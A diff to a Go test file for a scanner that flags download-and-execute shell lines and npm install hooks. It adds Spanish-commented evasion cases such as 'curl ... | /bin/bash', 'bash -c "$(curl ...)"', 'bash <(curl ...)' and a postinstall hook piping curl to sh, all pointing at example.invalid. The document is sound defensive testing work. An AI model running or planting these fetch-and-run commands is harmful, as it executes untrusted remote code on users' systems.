@@ -241,6 +241,55 @@ func TestDownloadExec(t *testing.T) {
 			content: "curl -sL https://example.invalid/f.tgz | shasum -a 256\n",
 			want:    none,
 		},
+
+		// ----- Ronda 2: evasiones encontradas al probar la primera versión -----
+		// Todas son formas reales y frecuentes de "descargar y ejecutar".
+		{
+			// Ruta absoluta al shell: después del "|" no viene "bash" sino "/bin/bash".
+			name:    "pipe a ruta absoluta del shell",
+			content: "curl -fsSL https://example.invalid/i.sh | /bin/bash\n",
+			want:    []string{"1:high"},
+		},
+		{
+			// sudo con opciones entre medio (-E conserva el entorno).
+			name:    "sudo con flags",
+			content: "curl https://example.invalid/i.sh | sudo -E bash\n",
+			want:    []string{"1:high"},
+		},
+		{
+			// Sustitución de comandos: el shell recibe el script como argumento.
+			// Es la forma que usa, por ejemplo, el instalador de Homebrew.
+			// No hay "|" en la línea, así que necesitas otra alternativa en el regex.
+			name:    "bash -c con $(curl)",
+			content: "/bin/bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"\n",
+			want:    []string{"1:high"},
+		},
+		{
+			name:    "sh -c con $(wget)",
+			content: "sh -c \"$(wget -qO- https://example.invalid/i.sh)\"\n",
+			want:    []string{"1:high"},
+		},
+		{
+			// Sustitución de procesos: <( ... ) aparece como un archivo para bash.
+			name:    "bash <(curl)",
+			content: "bash <(curl -s https://example.invalid/i.sh)\n",
+			want:    []string{"1:high"},
+		},
+		{
+			// Que tu solución a /bin/bash no rompa el caso shasum.
+			name:    "pipe a ruta absoluta de shasum sigue siendo legítimo",
+			content: "curl -sL https://example.invalid/f | /usr/bin/shasum -a 256\n",
+			want:    none,
+		},
+		{
+			// Hay curl, hay "sh" (en "x.sh") y hay "$(" en la misma línea, pero
+			// nada ejecuta lo descargado. Si tu regex para "$(" es demasiado
+			// laxo, este caso lo atrapa. Pista: exige que el shell vaya
+			// seguido (con espacios y quizá -c y comillas) de $( o <(.
+			name:    "x.sh y $( sin ejecución",
+			content: "curl -o x.sh https://example.invalid && echo \"$(cat x.sh)\"\n",
+			want:    none,
+		},
 		{
 			name:    "solo descarga, sin ejecución",
 			content: "curl -o archivo.zip https://example.invalid/f.zip\n",
@@ -325,6 +374,35 @@ func TestInstallHooks(t *testing.T) {
 			path:    "packages/core/package.json",
 			content: `{"scripts":{"preinstall":"node x.js"}}`,
 			want:    []string{"0:medium"},
+		},
+
+		// ----- Ronda 2: evasión por tipos en el JSON -----
+		{
+			// El JSON es VÁLIDO, pero "x" es un número. Al decodificar en
+			// map[string]string, json.Unmarshal devuelve error y el
+			// analizador se calla. npm, en cambio, ignora "x" y SÍ ejecuta
+			// el postinstall (comprobado con npm 10.9.4).
+			// Pista: decodifica los scripts en algo más flexible
+			// (map[string]any o map[string]json.RawMessage) y quédate solo
+			// con los valores que de verdad son strings.
+			name:    "otro script no-string no esconde el postinstall",
+			path:    "package.json",
+			content: `{"scripts":{"postinstall":"curl https://example.invalid/x | sh","x":1}}`,
+			want:    []string{"0:high"},
+		},
+		{
+			name:    "otro script como array tampoco",
+			path:    "package.json",
+			content: `{"scripts":{"x":["a"],"preinstall":"node x.js"}}`,
+			want:    []string{"0:medium"},
+		},
+		{
+			// Si el hook mismo no es string, npm no tiene un comando que
+			// ejecutar: no lo reportamos.
+			name:    "hook que no es string se ignora",
+			path:    "package.json",
+			content: `{"scripts":{"postinstall":123}}`,
+			want:    none,
 		},
 		{
 			name:    "otro archivo .json se ignora",
